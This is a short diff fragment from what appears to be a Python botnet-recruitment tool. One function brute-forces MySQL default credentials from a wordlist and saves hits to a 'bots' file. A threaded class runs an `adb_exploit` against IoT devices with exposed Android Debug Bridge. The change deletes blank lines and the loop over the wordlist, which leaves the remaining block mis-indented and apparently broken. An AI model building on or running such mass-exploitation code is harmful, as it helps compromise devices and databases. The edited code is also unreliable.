@@ -344,12 +344,6 @@ def mass_mysql_default(threads=100,wl=wordlist,filename='mysql_default_bots.txt'
     break
  for x in thr:
      del x
-
-
-
-
-
-
 class iotadb(threading.Thread):
  def run(self):
   while True:
@@ -363,7 +357,6 @@ class iotadb(threading.Thread):
    except Exception as ex: 
     pass
    if i==True:
-    for x in wordlist:
      try:
       q=adb_exploit(ip)
       if q==True:
